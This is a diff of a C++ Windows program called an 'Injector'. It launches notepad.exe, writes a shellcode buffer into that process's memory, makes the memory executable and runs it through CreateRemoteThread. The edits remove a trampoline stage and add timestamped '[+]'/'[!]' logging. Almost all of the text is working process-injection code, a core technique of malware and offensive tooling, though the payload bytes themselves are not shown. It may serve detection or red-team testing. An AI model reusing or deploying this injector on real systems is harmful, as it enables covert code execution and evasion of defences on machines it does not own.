@@ -4,10 +4,10 @@
 #include <sstream>
 
 // print current timestamp in ISO 8601 format, e.g. 2025-08-18 18:03:51.123Z
-void printCurrentTime(std::string prefix) {
+void printCurrentTime() {
     SYSTEMTIME st;
     GetSystemTime(&st);
-    std::cout << prefix
+    std::cout << "[+] "
         << std::setfill('0')
         << std::setw(4) << st.wYear << '-'
         << std::setw(2) << st.wMonth << '-'
@@ -16,7 +16,7 @@ void printCurrentTime(std::string prefix) {
         << std::setw(2) << st.wMinute << ':'
         << std::setw(2) << st.wSecond << '.'
         << std::setw(3) << st.wMilliseconds
-		<< "Z\n";
+        << " > ";
 }
 
 int main(int argc, char** argv) {
@@ -41,30 +41,31 @@ int main(int argc, char** argv) {
     }
 
     // print current PID
-	std::cout << "Injector started. PID: " << GetCurrentProcessId() << "\n";
+    printCurrentTime();
+    std::cout << "Injector started with PID " << GetCurrentProcessId() << "\n";
 
     // start new process to inject to
     LPCWSTR newProcess = L"C:\\Windows\\System32\\notepad.exe";
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (!CreateProcess(newProcess, nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
-        std::cerr << "Failed to start process: " << GetLastError() << "\n";
+        std::cerr << "[!] Failed to start process: " << GetLastError() << "\n";
         return 1;
     }
 
-    std::cout << "New process started. PID: " << pi.dwProcessId << "\n";
-	printCurrentTime("Process started at: ");
+	printCurrentTime();
+    std::cout << "New process started with PID " << pi.dwProcessId << "\n";
     switch (s) {
         case NoWait:
             break;
         case WaitTime:
             for (int i = waitTime; i > 0; i--) {
-                std::cout << "Starting injection in " << i << "\n";
+                std::cout << "[*] Starting injection in " << i << "\n";
                 Sleep(1000);
             };
             break;
         case WaitForEnter:
-            std::cout << "Press ENTER to start injection...\n";
+            std::cout << "[*] Press ENTER to start injection...\n";
             std::cin.get();;
         default:
             break;
@@ -73,7 +74,7 @@ int main(int argc, char** argv) {
     // open process with read/write access
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pi.dwProcessId);
     if (!hProcess) {
-        std::cerr << "Failed to open process: " << GetLastError() << "\n";
+        std::cerr << "[!] Failed to open process: " << GetLastError() << "\n";
         return 1;
     }
 
@@ -83,18 +84,21 @@ int main(int argc, char** argv) {
     // allocate memory to new process
     LPVOID remoteAddrShellCode = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (remoteAddrShellCode) {
-        std::cout << "Memory allocated at address: " << remoteAddrShellCode << "\n";
+        printCurrentTime();
+        std::cout << "Memory allocated at address " << remoteAddrShellCode << "\n";
     }
     else {
         std::cerr << "Failed to allocate memory: " << GetLastError() << "\n";
         return 1;
     }
 
+    /*
 	// read process memory information
 	MEMORY_BASIC_INFORMATION mbi;
     if (VirtualQueryEx(hProcess, remoteAddrShellCode, &mbi, sizeof(mbi))) {
-        std::cout << "Memory region at address: " << remoteAddrShellCode << " is 0x" << std::hex
-            << mbi.State << std::dec << " with protection: " << mbi.Protect << "\n";
+        printCurrentTime();
+        std::cout << "Memory region at address " << remoteAddrShellCode << " is State 0x" << std::hex
+            << mbi.State << std::dec << " with protection 0x" << std::hex << mbi.Protect << std::dec << "\n";
     }
     else {
         std::cerr << "Failed to query memory: " << GetLastError() << "\n";
@@ -102,41 +106,13 @@ int main(int argc, char** argv) {
         CloseHandle(hProcess);
         return 1;
 	}
+    */
 
     // write value into process' memory
     SIZE_T bytesWritten;
     if (WriteProcessMemory(hProcess, remoteAddrShellCode, &shellcode, sizeof(shellcode), &bytesWritten)) {
-        std::cout << "Value written to address: " << remoteAddrShellCode << "\n";
-    }
-    else {
-        std::cerr << "Failed to write memory: " << GetLastError() << "\n";
-        return 1;
-    }
-
-    printCurrentTime("Shellcode injected at: ");
-
-    BYTE trampoline[12] = { 0x48, 0xB8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xFF, 0xE0 };
-    memcpy(&trampoline[2], &remoteAddrShellCode, 8);
-
-    std::cout << "Trampoline Op Code: ";
-    for (size_t i = 0; i < 12; i++) {
-        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(trampoline[i]) << " ";
-    }
-    std::cout << std::dec << "\n";
-
-    // allocate memory for trampoline
-    LPVOID remoteAddrTrampoline = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (remoteAddrTrampoline) {
-        std::cout << "Trampoline Memory allocated at address: " << remoteAddrTrampoline << "\n";
-    }
-    else {
-        std::cerr << "Failed to allocate trampoline memory: " << GetLastError() << "\n";
-        return 1;
-    }
-
-    // write value into process' memory
-    if (WriteProcessMemory(hProcess, remoteAddrTrampoline, &trampoline, sizeof(trampoline), &bytesWritten)) {
-        std::cout << "Value written to address: " << remoteAddrTrampoline << "\n";
+        printCurrentTime();
+        std::cout << "Shellcode written to address " << remoteAddrShellCode << "\n";
     }
     else {
         std::cerr << "Failed to write memory: " << GetLastError() << "\n";
@@ -147,7 +123,8 @@ int main(int argc, char** argv) {
 	// change memory protection to executable
     DWORD oldProtect;
     if (VirtualProtectEx(hProcess, remoteAddrShellCode, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
-        std::cout << "Memory protection changed to PAGE_EXECUTE_READ.\n";
+        printCurrentTime();
+        std::cout << "Memory protection changed to PAGE_EXECUTE_READ" << "\n";
     }
     else {
         std::cerr << "Failed to change memory protection: " << GetLastError() << "\n";
@@ -155,23 +132,12 @@ int main(int argc, char** argv) {
         CloseHandle(hProcess);
         return 1;
     }
-    if (VirtualProtectEx(hProcess, remoteAddrTrampoline, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
-        std::cout << "Trampoline memory protection changed to PAGE_EXECUTE_READ.\n";
-    }
-    else {
-        std::cerr << "Failed to change memory protection: " << GetLastError() << "\n";
-        VirtualFreeEx(hProcess, remoteAddrShellCode, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }
-
-    printCurrentTime("RX protection at: ");
 
 	// call create remote thread
-	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteAddrTrampoline, nullptr, 0, nullptr);
+    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteAddrShellCode, nullptr, 0, nullptr);
     if (hThread) {
-        std::cout << "Remote thread created successfully.\n";
-        printCurrentTime("Shellcode called at: ");
+        printCurrentTime();
+        std::cout << "Remote thread created successfully" << "\n";
     }
     else {
         std::cerr << "Failed to create remote thread: " << GetLastError() << "\n";
